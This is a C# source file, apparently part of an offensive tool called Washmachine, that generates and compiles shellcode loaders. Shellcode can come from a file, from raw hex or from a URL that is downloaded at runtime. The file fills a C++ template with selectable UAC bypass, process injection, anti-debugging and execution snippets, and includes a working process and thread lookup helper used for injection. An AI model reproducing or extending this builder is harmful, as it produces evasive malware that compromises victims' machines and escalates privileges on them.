using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

public sealed class CompilerService : ICompilerService
{
    private const string ProcessLookupHelper = """
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>

DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);

    DWORD result = 0;

    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            std::wstring exe = entry.szExeFile;
            std::wstring exeLower = exe;
            std::wstring targetLower = processName;
            std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), ::towlower);
            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::towlower);

            if (exeLower == targetLower)
            {
                if (returnProcessId)
                {
                    result = entry.th32ProcessID;
                }
                else
                {
                    HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                    if (threadSnapshot != INVALID_HANDLE_VALUE)
                    {
                        THREADENTRY32 threadEntry{};
                        threadEntry.dwSize = sizeof(threadEntry);
                        if (Thread32First(threadSnapshot, &threadEntry))
                        {
                            do
                            {
                                if (threadEntry.th32OwnerProcessID == entry.th32ProcessID)
                                {
                                    result = threadEntry.th32ThreadID;
                                    break;
                                }
                            } while (Thread32Next(threadSnapshot, &threadEntry));
                        }

                        CloseHandle(threadSnapshot);
                    }
                }

                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return result;
}
""";

    private readonly IAppPaths _paths;
    private readonly IBin2ShellRunner _bin2ShellRunner;
    private readonly ICodeSnippetCatalogService _snippets;
    private readonly IAppLogger _logger;

    public CompilerService(
        IAppPaths paths,
        IBin2ShellRunner bin2ShellRunner,
        ICodeSnippetCatalogService snippets,
        IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _bin2ShellRunner = bin2ShellRunner ?? throw new ArgumentNullException(nameof(bin2ShellRunner));
        _snippets = snippets ?? throw new ArgumentNullException(nameof(snippets));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public async Task<CompilerResult> CompileAsync(UiData data, MsvcToolchain toolchain, CancellationToken cancellationToken = default)
    {
        if (data == null) throw new ArgumentNullException(nameof(data));
        if (toolchain == null) throw new ArgumentNullException(nameof(toolchain));

        ValidateEnvironment();

        var notes = new List<string>();

        try
        {
            var plan = new CppCompilationPlan();
            var shellcodeSource = DetermineShellcodeSource(data);

            await ApplyShellcodeAsync(plan, data, shellcodeSource, notes, cancellationToken).ConfigureAwait(false);
            ApplyFeatureSelections(plan, data, notes);

            var sourceCode = RenderCompilationUnit(plan);
            var sourcePath = await PersistSourceAsync(sourceCode, cancellationToken).ConfigureAwait(false);

            notes.Add($"Generated C++ source at {sourcePath}.");
            _logger.Ok($"Generated C++ source at {sourcePath}.");

            var executablePath = await CompileWithMsvcAsync(toolchain, sourcePath, notes, cancellationToken).ConfigureAwait(false);

            notes.Add($"Native executable built at {executablePath}.");
            _logger.Ok($"Native executable built at {executablePath}.");

            return new CompilerResult(true, executablePath, sourcePath, sourceCode, notes);
        }
        catch (OperationCanceledException)
        {
            _logger.Warn("Compilation cancelled by user.");
            notes.Add("Compilation cancelled.");
            return new CompilerResult(false, null, null, null, notes);
        }
        catch (Exception ex)
        {
            _logger.Error($"Compilation failed: {ex.Message}");
            notes.Add(ex.Message);
            return new CompilerResult(false, null, null, null, notes);
        }
    }

    private void ValidateEnvironment()
    {
        var errors = _paths.Validate();
        if (errors.Count == 0)
            return;

        foreach (var error in errors)
        {
            _logger.Error(error);
        }

        throw new InvalidOperationException("Required project assets are missing.");
    }

    private async Task ApplyShellcodeAsync(
        CppCompilationPlan plan,
        UiData data,
        ShellcodeSource source,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        switch (source.Kind)
        {
            case ShellcodeSourceKind.None:
                _logger.Warn("No shellcode source supplied; using default stub.");
                notes.Add("No external shellcode supplied; using default stub.");
                break;

            case ShellcodeSourceKind.File:
                await EncodeShellcodeFromFileAsync(plan, source.Value, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Raw:
                string savedPath = SaveRawHexToBin(source.Value);
                notes.Add($"Raw shellcode saved to {savedPath}.");
                await EncodeShellcodeFromFileAsync(plan, savedPath, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Url:
                InjectUrlShellcode(plan, source.Value, notes);
                break;
        }
    }

    private async Task EncodeShellcodeFromFileAsync(
        CppCompilationPlan plan,
        string filePath,
        UiData data,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("Shellcode file not found.", filePath);

        var args = BuildBin2ShellArguments(data, filePath);
        _logger.Info($"Bin2Shell command: python main.py {string.Join(" ", args.Select(QuoteArg))}");

        string encoded = await _bin2ShellRunner
            .RunAsync(args, cancellationToken: cancellationToken)
            .ConfigureAwait(false);

        if (string.IsNullOrWhiteSpace(encoded))
            throw new InvalidOperationException("Bin2Shell returned empty output.");

        plan.EncodedShellcodeSnippet = encoded.Trim();
        notes.Add("Encoded shellcode prepared.");
        _logger.Ok("Encoded shellcode prepared.");
    }

    private void InjectUrlShellcode(CppCompilationPlan plan, string url, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL value is required.", nameof(url));

        var escaped = EscapeForCxxString(url.Trim());
        plan.UrlShellcodeSnippet = $"PCHAR code_blob = UrlDownloadHexTextA((PCHAR)\"{escaped}\", &dwSize);";
        notes.Add("Shellcode URL embedded into plan.");
        _logger.Ok("Shellcode URL embedded.");
    }

    private async Task<string> PersistSourceAsync(string sourceCode, CancellationToken cancellationToken)
    {
        string directory = _paths.EnsureTempSourceDirectory();
        Directory.CreateDirectory(directory);

        string fileName = $"wash_{DateTime.UtcNow:yyyyMMdd_HHmmss}_{Guid.NewGuid():N}.cpp";
        string path = Path.Combine(directory, fileName);

        await File.WriteAllTextAsync(path, sourceCode, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false), cancellationToken)
            .ConfigureAwait(false);

        return path;
    }

    private async Task<string> CompileWithMsvcAsync(MsvcToolchain toolchain, string sourcePath, ICollection<string> notes, CancellationToken cancellationToken)
    {
        if (!File.Exists(sourcePath))
            throw new FileNotFoundException("Source file not found.", sourcePath);

        string workingDir = Path.GetDirectoryName(sourcePath) ?? _paths.EnsureTempSourceDirectory();
        string baseName = Path.GetFileNameWithoutExtension(sourcePath);
        string objPath = Path.Combine(workingDir, baseName + ".obj");
        string pdbPath = Path.Combine(workingDir, baseName + ".pdb");
        string ilkPath = Path.Combine(workingDir, baseName + ".ilk");
        string exePath = Path.Combine(workingDir, baseName + ".exe");

        string clArgs = string.Join(" ", new[]
        {
            "/nologo",
            "/MD",
            "/O1",
            "/GL",
            "/Gy",
            "/Gw",
            "/GF",
            "/Oy",
            "/EHsc",
            "/std:c++17",
            "/DNDEBUG",
            $"/Fo{QuoteArg(objPath)}",
            $"/Fe{QuoteArg(exePath)}",
            QuoteArg(sourcePath),
            "/link",
            "/LTCG",
            "/OPT:REF",
            "/OPT:ICF",
            "/INCREMENTAL:NO"
        });

        string command = $"call {QuoteArg(toolchain.VcVarsPath)} amd64 && {QuoteArg(toolchain.ClPath)} {clArgs}";
        notes.Add($"MSVC command: {command}");

        var psi = new ProcessStartInfo("cmd.exe")
        {
            Arguments = "/c " + command,
            WorkingDirectory = workingDir,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        };

        using var process = Process.Start(psi) ?? throw new InvalidOperationException("Failed to start MSVC compiler process.");
        string stdOut = await process.StandardOutput.ReadToEndAsync();
        string stdErr = await process.StandardError.ReadToEndAsync();

        await process.WaitForExitAsync(cancellationToken).ConfigureAwait(false);

        if (!string.IsNullOrWhiteSpace(stdOut))
            notes.Add(stdOut.Trim());
        if (!string.IsNullOrWhiteSpace(stdErr))
            notes.Add(stdErr.Trim());

        if (process.ExitCode != 0 || !File.Exists(exePath))
        {
            throw new InvalidOperationException($"MSVC compilation failed with exit code {process.ExitCode}.\n{stdOut}\n{stdErr}");
        }

        CleanupIntermediate(objPath, pdbPath, ilkPath);
        return exePath;
    }

    private void ApplyFeatureSelections(CppCompilationPlan plan, UiData data, ICollection<string> notes)
    {
        ApplyComboSelection(
            data,
            "genericShellcodeComboBox",
            "GENERIC SHELLCODE PAYLOADS FOR TESTINGS",
            notes,
            item => plan.GenericShellcodeSnippet = item.Snippet);

        ApplyGuardrailSelection(plan, data, notes);
        ApplyProcessInjectionSelection(plan, data, notes);

        ApplyComboSelection(
            data,
            "shellcodeExecutionComboBox",
            "SHELLCODE EXECUTION",
            notes,
            item => plan.ShellcodeExecutionSnippet = item.Snippet);

        ApplyComboSelection(
            data,
            "UACBComboBox",
            "UAC BYPASSES",
            notes,
            item => plan.UacBypassSnippet = item.Snippet);

        ApplyAntiDebugSelection(plan, data, notes);
    }

    private void ApplyComboSelection(
        UiData data,
        string controlName,
        string catalogHeader,
        ICollection<string> notes,
        Action<CodeSnippetItem> apply)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, controlName, out var selection))
            return;

        if (!TryResolveSnippet(catalogHeader, selection, out var section, out var item))
            return;

        apply(item);
        LogSnippetEnabled(section.Template, item.Id, notes);
    }

    private void ApplyGuardrailSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, "guardrailComboBox", out var selection))
            return;

        if (!TryResolveSnippet("GUARDRAILS", selection, out var section, out var item))
            return;

        var parameter = data.TextBoxes.TryGetValue("guardrailParamTextBox", out var rawParam)
            ? rawParam.Trim()
            : string.Empty;

        string snippet = item.Snippet;
        bool requiresParameter =
            snippet.Contains("$guardrail_param$", StringComparison.Ordinal) ||
            snippet.Contains("__GUARDRAIL_PARAM__", StringComparison.Ordinal);

        if (requiresParameter && string.IsNullOrWhiteSpace(parameter))
            throw new InvalidOperationException("Guardrail parameter is required for the selected guardrail.");

        snippet = snippet.Replace("$guardrail_param$", parameter)
                         .Replace("__GUARDRAIL_PARAM__", parameter);

        plan.GuardrailSnippets.Add(snippet);
        LogSnippetEnabled(section.Template, item.Id, notes);
    }

    private void ApplyProcessInjectionSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, "psInjComboBox", out var selection))
            return;

        if (!data.TextBoxes.TryGetValue("PsInjPsNameTextBox", out var psName) || string.IsNullOrWhiteSpace(psName))
            throw new InvalidOperationException("Process injection requires a target process name.");

        if (!TryResolveSnippet("PROCESS INJECTION", selection, out var section, out var item))
            return;

        var trimmedName = psName.Trim();
        string snippet = item.Snippet.Replace("$psname$", trimmedName);

        plan.ProcessInjectionSnippet = snippet;
        plan.ProcessLookupHelper = ProcessLookupHelper;

        LogSnippetEnabled(section.Template, item.Id, notes);

        var note = $"Process injection target set to {trimmedName}.";
        notes.Add(note);
        _logger.Ok(note);
    }

    private void ApplyAntiDebugSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
    {
        if (!data.ListBoxes.TryGetValue("antiDebugListBox", out var selections) || selections.Count == 0)
            return;

        if (!_snippets.TryGetSectionByHeader("ANTI-DEBUGGING", out var section))
        {
            _logger.Warn("Snippet section 'ANTI-DEBUGGING' is missing in the catalog.");
            return;
        }

        var uniqueSelections = selections
            .Where(s => !string.IsNullOrWhiteSpace(s))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .ToList();

        if (uniqueSelections.Count == 0)
            return;

        foreach (var selection in uniqueSelections)
        {
            if (!section.TryGetItem(selection, out var item))
            {
                _logger.Warn($"Anti-debugging method '{selection}' not found in snippet section.");
                continue;
            }

            plan.AntiDebuggingSnippets.Add(item.Snippet);
            LogSnippetEnabled(section.Template, item.Id, notes);
        }
    }

    private string RenderCompilationUnit(CppCompilationPlan plan)
    {
        var sb = new StringBuilder();
        sb.AppendLine("#include \"Win32Helper.h\"");
        sb.AppendLine();

        if (!string.IsNullOrWhiteSpace(plan.ProcessLookupHelper))
        {
            sb.AppendLine(plan.ProcessLookupHelper!.TrimEnd());
            sb.AppendLine();
        }

        sb.AppendLine("INT main(VOID)");
        sb.AppendLine("{");

        bool hasEncodedShellcode = !string.IsNullOrWhiteSpace(plan.EncodedShellcodeSnippet);

        if (hasEncodedShellcode)
        {
            AppendIndentedBlock(sb, plan.EncodedShellcodeSnippet!, 1);
        }
        else
        {
            sb.AppendLine("    unsigned int code_blob_len = 0;");
            sb.AppendLine("    PCHAR code_blob = nullptr;");
        }

        sb.AppendLine("    DWORD dwSize = (DWORD)code_blob_len;");

        if (!string.IsNullOrWhiteSpace(plan.UrlShellcodeSnippet))
        {
            sb.AppendLine();
            sb.AppendLine("    // URL-based shellcode");
            AppendIndentedBlock(sb, plan.UrlShellcodeSnippet!, 1);
        }

        if (!string.IsNullOrWhiteSpace(plan.GenericShellcodeSnippet))
        {
            sb.AppendLine();
            sb.AppendLine("    // Generic shellcode payload");
            AppendIndentedBlock(sb, plan.GenericShellcodeSnippet!, 1);
        }

        if (plan.GuardrailSnippets.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("    // Guardrails");
            AppendIndentedBlock(sb, string.Join(Environment.NewLine, plan.GuardrailSnippets), 1);
        }

        if (plan.AntiDebuggingSnippets.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("    // Anti-debugging");
            AppendIndentedBlock(sb, string.Join(Environment.NewLine, plan.AntiDebuggingSnippets), 1);
        }

        if (!string.IsNullOrWhiteSpace(plan.UacBypassSnippet))
        {
            sb.AppendLine();
            sb.AppendLine("    // UAC bypass");
            AppendIndentedBlock(sb, plan.UacBypassSnippet!, 1);
        }

        if (!string.IsNullOrWhiteSpace(plan.ProcessInjectionSnippet))
        {
            sb.AppendLine();
            sb.AppendLine("    // Process injection");
            AppendIndentedBlock(sb, plan.ProcessInjectionSnippet!, 1);
        }

        if (!string.IsNullOrWhiteSpace(plan.ShellcodeExecutionSnippet))
        {
            sb.AppendLine();
            sb.AppendLine("    // Shellcode execution");
            AppendIndentedBlock(sb, plan.ShellcodeExecutionSnippet!, 1);
        }

        sb.AppendLine();
        sb.AppendLine("    Sleep(1);");
        sb.AppendLine("    return 0;");
        sb.AppendLine("}");

        return sb.ToString();
    }

    private bool TryResolveSnippet(string catalogHeader, string selection, out CodeSnippetSection section, out CodeSnippetItem item)
    {
        if (!_snippets.TryGetSectionByHeader(catalogHeader, out section))
        {
            _logger.Warn($"Snippet section '{catalogHeader}' not found in the catalog.");
            item = null!;
            return false;
        }

        if (!section.TryGetItem(selection, out item))
        {
            _logger.Warn($"Unable to find method '{selection}' in section '{catalogHeader}'.");
            return false;
        }

        return true;
    }

    private void LogSnippetEnabled(string sectionName, string itemId, ICollection<string> notes)
    {
        var message = $"Enabled {sectionName}:{itemId}.";
        notes.Add(message);
        _logger.Ok(message);
    }

    private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
    {
        var args = new List<string> { "-y", _paths.Bin2ShellAlgos };

        if (TryParseIndex(data, "bin2hexEncoder", out int encoder))
        {
            args.Add("-e");
            args.Add(encoder.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexCompressor", out int compressor))
        {
            args.Add("-c");
            args.Add(compressor.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexEnvelope", out int envelope))
        {
            args.Add("-env");
            args.Add(envelope.ToString(CultureInfo.InvariantCulture));
        }

        args.Add(shellcodeFile);
        return args;
    }

    private static bool TryParseIndex(UiData data, string key, out int index)
    {
        index = 0;
        return data.ComboBoxes.TryGetValue(key, out var raw) && TryParseIndex(raw, out index) && index > 0;
    }

    private static bool TryParseIndex(string? raw, out int index)
    {
        index = 0;
        if (string.IsNullOrWhiteSpace(raw))
            return false;

        raw = raw.Trim();

        int idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
        if (idxEq >= 0)
        {
            int colon = raw.IndexOf(':', idxEq);
            if (colon >= 0 && int.TryParse(raw.AsSpan(colon + 1).Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
        }

        int eq = raw.IndexOf('=');
        if (eq >= 0)
        {
            int start = eq + 1;
            while (start < raw.Length && char.IsWhiteSpace(raw[start])) start++;
            int end = start;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (end > start && int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
        }

        int dash = raw.IndexOf('-');
        string head = (dash >= 0 ? raw[..dash] : raw).Trim();
        if (int.TryParse(head, NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
            return true;

        for (int k = 0; k < raw.Length; k++)
        {
            if (!char.IsDigit(raw[k])) continue;
            int start = k;
            int end = k;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
            k = end;
        }

        index = 0;
        return false;
    }

    private static bool TryGetNonEmpty(IDictionary<string, string> source, string key, out string value)
    {
        value = string.Empty;
        if (!source.TryGetValue(key, out var raw) || string.IsNullOrWhiteSpace(raw))
            return false;

        value = raw.Trim();
        return value.Length > 0;
    }

    private ShellcodeSource DetermineShellcodeSource(UiData data)
    {
        data.TextBoxes.TryGetValue("shellcodeFile", out var filePathRaw);
        data.TextBoxes.TryGetValue("shellcodeRAW", out var rawInput);
        data.TextBoxes.TryGetValue("shellcodeURL", out var urlInput);

        bool hasFile = !string.IsNullOrWhiteSpace(filePathRaw);
        bool hasRaw = !string.IsNullOrWhiteSpace(rawInput);
        bool hasUrl = !string.IsNullOrWhiteSpace(urlInput);

        int selected = new[] { hasFile, hasRaw, hasUrl }.Count(x => x);

        if (selected == 0)
            return new ShellcodeSource(ShellcodeSourceKind.None, string.Empty);
        if (selected > 1)
            throw new InvalidOperationException("Multiple shellcode sources detected. Provide only one.");

        if (hasFile) return new ShellcodeSource(ShellcodeSourceKind.File, filePathRaw!.Trim());
        if (hasRaw) return new ShellcodeSource(ShellcodeSourceKind.Raw, rawInput!.Trim());
        return new ShellcodeSource(ShellcodeSourceKind.Url, urlInput!.Trim());
    }

    private string SaveRawHexToBin(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            throw new ArgumentException("Raw hex input is required.", nameof(raw));

        byte[] bytes;
        var matches = Regex.Matches(raw, "\\\\x([0-9A-Fa-f]{2})");
        if (matches.Count > 0)
        {
            bytes = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                bytes[i] = Convert.ToByte(matches[i].Groups[1].Value, 16);
            }
        }
        else
        {
            var hexOnly = new string(raw.Where(Uri.IsHexDigit).ToArray());
            if (hexOnly.Length == 0)
                throw new FormatException("Input does not appear to be hex-encoded.");
            if (hexOnly.Length % 2 != 0)
                throw new FormatException("Hex input must contain an even number of digits.");

            bytes = new byte[hexOnly.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hexOnly.Substring(i * 2, 2), 16);
            }
        }

        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(bytes);
        var sb = new StringBuilder(hash.Length * 2);
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));
        string hashHex = sb.ToString();

        string dir = _paths.EnsureTempShellcodeDirectory();
        Directory.CreateDirectory(dir);

        string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss", CultureInfo.InvariantCulture);
        string fileName = $"{hashHex}_{timestamp}.bin";
        string path = Path.Combine(dir, fileName);

        File.WriteAllBytes(path, bytes);
        _logger.Ok($"Raw shellcode persisted to {path}.");
        return path;
    }

    private static string QuoteArg(string value)
    {
        if (string.IsNullOrEmpty(value))
            return "\"\"";

        return value.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0
            ? $"\"{value.Replace("\"", "\\\"")}\""
            : value;
    }

    private static string EscapeForCxxString(string value)
        => value.Replace("\\", "\\\\").Replace("\"", "\\\"");

    private static void AppendIndentedBlock(StringBuilder sb, string content, int indentLevel)
    {
        if (string.IsNullOrWhiteSpace(content))
            return;

        string indent = new string(' ', indentLevel * 4);
        foreach (var line in SplitLines(content))
        {
            if (line.Length == 0)
            {
                sb.AppendLine(indent);
            }
            else
            {
                sb.Append(indent);
                sb.AppendLine(line);
            }
        }
    }

    private static IEnumerable<string> SplitLines(string value)
    {
        return value
            .Replace("\r\n", "\n")
            .Replace('\r', '\n')
            .Split('\n');
    }

    private static void CleanupIntermediate(params string[] paths)
    {
        foreach (var path in paths)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(path) && File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch
            {
                // ignore cleanup failures
            }
        }
    }

    private sealed record ShellcodeSource(ShellcodeSourceKind Kind, string Value);

    private enum ShellcodeSourceKind
    {
        None,
        File,
        Raw,
        Url
    }
}
